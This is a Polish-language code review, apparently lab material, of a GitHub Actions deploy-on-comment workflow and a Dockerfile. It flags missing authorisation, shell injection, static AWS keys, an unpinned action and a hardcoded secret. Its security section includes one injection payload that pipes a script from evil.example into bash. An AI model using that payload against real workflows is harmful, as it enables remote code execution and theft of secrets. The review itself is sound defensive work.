# Recenzja PR #52 — `deploy-from-comment.yml` + `Dockerfile`

*(katalog `labs/lab04-cline-jako-recenzent/start`, opis w `PR-opis.md`, recenzja wykonana przez Claude Code / `/pr-review`)*

## Przebieg 1 — poprawność

**`deploy-from-comment.yml:32`** — brak kroku konfigurującego dostęp do klastra (`aws eks update-kubeconfig` / OIDC assume-role) przed `kubectl set image`.
*Scenariusz:* workflow builduje i pushuje obraz, po czym `kubectl` nie ma kontekstu klastra i zwraca błąd „no configuration has been provided” — job kończy się niepowodzeniem, a krok „Odpowiedz w issue” (linia 34) w ogóle się nie wykona (brak `if: always()`). Funkcja opisana w PR nie zadziała ani razu.

**`deploy-from-comment.yml:32` vs konwencja repo** — deploy idzie przez `kubectl set image deployment/app`, ale wg `.claude/CLAUDE.md` wdrożenia w tym repo to obiekt `Rollout` (Argo Rollouts), nie `Deployment` (wyjątek to `quotes-api-d1` w lab02/dzień1).
*Scenariusz:* na realnym klastrze obiekt nazywa się `rollout/quotes-api`, więc `kubectl set image deployment/app ...` zwróci `deployments.apps "app" not found` — kolejny powód, dla którego to w ogóle nie zadziała na docelowej infrastrukturze.

**`deploy-from-comment.yml:17`** — puste wejście: komentarz `/deploy` bez nazwy gałęzi daje `BRANCH=""`.
*Scenariusz:* ktoś pisze samo „/deploy” (np. pytanie, literówka), `checkout@v4` z pustym `ref` cicho spada na gałąź domyślną repo i wdraża ją bez ostrzeżenia — zamiast jawnego błędu dostajemy nieoczekiwany deploy.

**`deploy-from-comment.yml`** — brak `concurrency:`.
*Scenariusz:* dwie osoby komentują `/deploy` niemal równocześnie (różne gałęzie) — oba joby budują i robią `kubectl set image` na ten sam `deployment/app` równolegle; wygrywa ten, który skończy jako ostatni, a bot w obu wątkach issue zgłosi sukces, mimo że faktycznie wdrożona jest tylko jedna z gałęzi.

## Przebieg 2 — bezpieczeństwo

**`deploy-from-comment.yml:4,7,11`** — trigger `issue_comment` + `permissions: write-all`, bez sprawdzenia `github.event.comment.author_association` w warunku `if:` (linia 11 sprawdza tylko prefiks tekstu).
*Scenariusz:* w publicznym repo każdy użytkownik GitHub, nawet bez uprawnień do repo, może dodać komentarz `/deploy cokolwiek` w dowolnym issue i uruchomić job z tokenem `write-all` oraz dostępem do sekretów AWS/ECR. To nieautoryzowane wykonanie z maksymalnymi uprawnieniami.

**`deploy-from-comment.yml:17,22,30-32`** — nazwa gałęzi z treści komentarza (`github.event.comment.body`, w pełni kontrolowana przez atakującego) trafia bez sanityzacji do `run:` przez interpolację `${{ steps.galaz.outputs.branch }}`, czyli podstawiana jest jako tekst skryptu przed uruchomieniem bash, nie jako zmienna środowiskowa.
*Scenariusz:* komentarz `/deploy x"; curl -s https://evil.example/p.sh | bash #` wstrzykuje dowolne polecenia shell wykonywane z uprawnieniami `write-all` i dostępem do `AWS_SECRET_ACCESS_KEY`, `ECR_REGISTRY` oraz klastra EKS — w połączeniu z powyższym brakiem autoryzacji to nieautoryzowane RCE + eksfiltracja sekretów + potencjalna kompromitacja łańcucha dostaw, osiągalne przez dowolnego komentującego.

**`deploy-from-comment.yml:26`** — logowanie do ECR statycznym `AWS_SECRET_ACCESS_KEY` zamiast przez OIDC.
*Scenariusz:* niezgodność z jawną konwencją repo („uwierzytelnianie do AWS przez OIDC” w `.claude/CLAUDE.md`) — a przy udanej iniekcji z punktu wyżej atakujący wynosi długożyjący klucz AWS użyteczny także poza GitHub Actions, zamiast krótkożyjącego tokenu OIDC.

**`deploy-from-comment.yml:35`** — `actions/github-script@main`, niepinowane do wersji (w odróżnieniu od `checkout@v4`).
*Scenariusz:* kompromitacja gałęzi `main` akcji `github-script` daje cichą egzekucję kodu w tym uprzywilejowanym (`write-all`) workflow przy kolejnym `/deploy`.

**`Dockerfile:9`** — `ENV APP_SECRET_KEY=tymczasowy-klucz-do-podmiany-przed-produkcja` zaszyty w warstwie obrazu, wbrew konwencji repo („Sekrety: GitHub Secrets, nigdy wartości w repo”).
*Scenariusz:* obraz zbudowany przez ten sam workflow trafia do ECR; każdy z dostępem do pull (a przy podatności z iniekcji — dowolny atakujący, który sam wywoła build) odczyta wartość przez `docker history --no-trunc` albo `docker inspect`. Jeśli ten klucz kiedykolwiek posłuży do podpisywania sesji/tokenów, jest skompromitowany od pierwszego dnia.

## Przebieg 3 — złożoność i wydajność

**`Dockerfile:4,6`** — `COPY . .` przed `RUN pip install` psuje cache warstw Dockera.
*Scenariusz:* przy modelu „deploy z komentarza” każda zmiana w kodzie aplikacji (nie tylko w `requirements.txt`) unieważnia warstwę z zależnościami — każdy `/deploy` robi pełny `pip install` od zera zamiast użyć cache, co niepotrzebnie wydłuża każdy build i naraża go na przejściowe błędy sieciowe przy instalacji.

**`Dockerfile:4`** — brak `.dockerignore`, `COPY . .` kopiuje cały kontekst builda.
*Scenariusz:* jeśli w katalogu roboczym w chwili builda znajdą się lokalne artefakty (`.git`, cache testów, pliki tymczasowe), trafią do obrazu — deklarowane „95 MB” może nie być odtwarzalne w praktyce, w zależności od stanu katalogu.

---

## Werdykt: **DO POPRAWY**

Blokujące:
1. `permissions: write-all` na triggerze `issue_comment` bez weryfikacji autora komentarza — nieautoryzowane wykonanie.
2. Wstrzykiwanie poleceń przez niesanityzowaną nazwę gałęzi użytą w `run:` (linie 22, 30–32).
3. Statyczny `AWS_SECRET_ACCESS_KEY` zamiast OIDC — niezgodność z konwencją repo i większy blast radius.
4. Zahardkodowany `APP_SECRET_KEY` w `Dockerfile:9`.
5. Brak kroku konfiguracji dostępu do klastra przed `kubectl set image` oraz użycie `deployment/app` zamiast `Rollout` — funkcja w obecnej formie prawdopodobnie w ogóle nie zadziała na tej infrastrukturze.
6. Brak `timeout-minutes` na poziomie joba (wymóg z `.claude/CLAUDE.md`).
7. `actions/github-script@main` niepinowane do wersji.

Do rozważenia (nieblokujące): brak `concurrency:`, puste wejście dla nazwy gałęzi, kolejność `COPY`/`pip install` w Dockerfile, brak `.dockerignore`, brak `USER` innego niż root.
